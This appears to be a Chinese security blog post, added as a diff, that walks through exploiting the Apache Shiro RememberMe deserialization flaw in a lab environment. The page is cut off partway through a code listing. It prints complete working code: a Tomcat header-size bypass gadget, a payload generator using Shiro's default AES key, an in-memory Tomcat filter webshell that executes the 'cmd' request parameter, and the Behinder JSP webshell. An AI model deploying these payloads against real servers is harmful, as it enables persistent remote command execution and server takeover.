@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Shiro回显与冰蝎内存马 
+      
+      
+      |
+    
+     LIK-ing の blogs
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+  <!-- clipboard -->
+  
+    <script src="https://unpkg.com/clipboard@2/dist/clipboard.min.js"></script>
+    
+<script src="/js/codeCopy.js"></script>
+
+  
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Shiro回显与冰蝎内存马</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-05-26 21:56:41
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/java/" title="java">
+                    <b>#</b> java
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Shiro回显与冰蝎内存马"><a href="#Shiro回显与冰蝎内存马" class="headerlink" title="Shiro回显与冰蝎内存马"></a>Shiro回显与冰蝎内存马</h1><p>在遇见shiro时，最常用的工具就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/j1anFen/shiro_attack</span><br><span class="line">https://github.com/feihong-cs/ShiroExploit-Deprecated</span><br></pre></td></tr></table></figure>
+
+<p>有时不会显还可以利用dnslong进行配合，但当遇见不出网的情况时，就不好利用了。</p>
+<h2 id="shiro反序列化原理简介"><a href="#shiro反序列化原理简介" class="headerlink" title="shiro反序列化原理简介"></a>shiro反序列化原理简介</h2><p>Apache Shiro框架提供了一个记住我的功能，这个功能在用户登录成功之后，会生成一个加密后的cookie。其中记住我的RememberMe就是cookie中的key。cookie的值是对相关信息进过序列化，再进行aes加密，再使用base64编码之后形成的。<br>服务端接收cookie值时，也是按照以下步骤解析的:<br>1.检索RememberMe cookie的值</p>
+<p>2.base64解码</p>
+<p>3.使用aes解码(加密密钥硬编码)</p>
+<p>4.进行反序列化操作(未做过滤处理)</p>
+<p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。</p>
+<h2 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h2><p>环境用的是P牛的环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/phith0n/JavaThings</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/image-20220526195702466.png" alt="image-20220526195702466"></p>
+<p>在tomcat的情况下会存在head头部过大的问题。网上文章很多，可以通过修改和classloader动态加载去解决，还有gzip压缩，我这里使用的是天下大木头师傅的修改headerT头大小。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/KpLi0rn/ShiroVulnEnv</span><br></pre></td></tr></table></figure>
+
+<p>具体代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(&quot;all&quot;)</span><br><span class="line">public class TomcatHeaderSize extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(&quot;context&quot;);</span><br><span class="line">            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(&quot;service&quot;);</span><br><span class="line">            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(&quot;req&quot;);</span><br><span class="line">            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(&quot;headerBufferSize&quot;);</span><br><span class="line">            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(&quot;getHandler&quot;,null);</span><br><span class="line">            contextField.setAccessible(true);</span><br><span class="line">            headerSizeField.setAccessible(true);</span><br><span class="line">            serviceField.setAccessible(true);</span><br><span class="line">            requestField.setAccessible(true);</span><br><span class="line">            getHandlerMethod.setAccessible(true);</span><br><span class="line">            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =</span><br><span class="line">                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());</span><br><span class="line">            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);</span><br><span class="line">            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();</span><br><span class="line">            for (int i = 0; i &lt; connectors.length; i++) &#123;</span><br><span class="line">                if (4 == connectors[i].getScheme().length()) &#123;</span><br><span class="line">                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();</span><br><span class="line">                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) &#123;</span><br><span class="line">                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();</span><br><span class="line">                        for (int j = 0; j &lt; classes.length; j++) &#123;</span><br><span class="line">                            // org.apache.coyote.AbstractProtocol$ConnectionHandler</span><br><span class="line">                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) &#123;</span><br><span class="line">                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(&quot;global&quot;);</span><br><span class="line">                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(&quot;processors&quot;);</span><br><span class="line">                                globalField.setAccessible(true);</span><br><span class="line">                                processorsField.setAccessible(true);</span><br><span class="line">                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));</span><br><span class="line">                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);</span><br><span class="line">                                for (int k = 0; k &lt; list.size(); k++) &#123;</span><br><span class="line">                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));</span><br><span class="line">                                    headerSizeField.set(tempRequest.getInputBuffer(),20000);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(20000);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>生成cookie的代码是从 洋洋师傅哪里学习的</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10696#toc-2">https://xz.aliyun.com/t/10696#toc-2</a></p>
+<p>具体代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class Client_memshell &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.get(com.govuln.shiroattack.memshell.BehinderFilter.class.getName());</span><br><span class="line"></span><br><span class="line">        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将上面两个都放到P牛的环境里面，还加一个filter的内存马，也是使用的洋洋师傅的</p>
+<p>具体代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import org.apache.catalina.core.StandardContext;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line">import org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line">import org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line">import org.apache.catalina.Context;</span><br><span class="line">import javax.servlet.*;</span><br><span class="line"></span><br><span class="line">public class BehinderFilter extends AbstractTranslet implements Filter &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            final String name = &quot;evil&quot;;</span><br><span class="line">            final String URLPattern = &quot;/*&quot;;</span><br><span class="line"></span><br><span class="line">            WebappClassLoaderBase webappClassLoaderBase =</span><br><span class="line">                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">            Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">            Configs.setAccessible(true);</span><br><span class="line">            Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">            BehinderFilter behinderFilter = new BehinderFilter();</span><br><span class="line"></span><br><span class="line">            FilterDef filterDef = new FilterDef();</span><br><span class="line">            filterDef.setFilter(behinderFilter);</span><br><span class="line">            filterDef.setFilterName(name);</span><br><span class="line">            filterDef.setFilterClass(behinderFilter.getClass().getName());</span><br><span class="line">            /**</span><br><span class="line">             * 将filterDef添加到filterDefs中</span><br><span class="line">             */</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap = new FilterMap();</span><br><span class="line">            filterMap.addURLPattern(URLPattern);</span><br><span class="line">            filterMap.setFilterName(name);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">            filterConfigs.put(name, filterConfig);</span><br><span class="line">        &#125; catch (NoSuchFieldException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (InstantiationException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        System.out.println(&quot;Do Filter ......&quot;);</span><br><span class="line">        String cmd;</span><br><span class="line">        if ((cmd = servletRequest.getParameter(&quot;cmd&quot;)) != null) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(</span><br><span class="line">                    new java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">                stringBuilder.append(line + &#x27;\n&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(&quot;doFilter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先尝试不进行header头大小改变，会报错</p>
+<p><img src="/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/image-20220526203252750.png" alt="image-20220526203252750"></p>
+<p>生成修改头大小的字符</p>
+<p><img src="/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/image-20220526201759730.png" alt="image-20220526201759730"></p>
+<p>抓包将字符添加在rememberMe后面</p>
+<p><img src="/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/image-20220526202329640.png" alt="image-20220526202329640"></p>
+<p>再生成Filter内存马的字符，再将字符加在rememberMe后面</p>
+<p><img src="/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/image-20220526202507872.png" alt="image-20220526202507872"></p>
+<p>最后再尝试命令执行，可以成功回显</p>
+<p><img src="/2022/05/26/Shiro%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC/image-20220526202609641.png" alt="image-20220526202609641"></p>
+<h2 id="注入冰蝎内存马"><a href="#注入冰蝎内存马" class="headerlink" title="注入冰蝎内存马"></a>注入冰蝎内存马</h2><p>先看看冰蝎的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    if (request.getMethod().equals(&quot;POST&quot;)) &#123;</span><br><span class="line">        String k = &quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br><span class="line">        session.putValue(&quot;u&quot;, k);</span><br><span class="line">        Cipher c = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(</span><br><span class="line">            c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())))</span><br><span class="line">            .newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将它放置到filter内存马的dofilter里面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import org.apache.catalina.core.StandardContext;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line">import org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line">import org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line">import org.apache.catalina.Context;</span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.*;</span><br><span class="line">import javax.crypto.*;</span><br><span class="line">import javax.crypto.spec.*;</span><br><span class="line">import 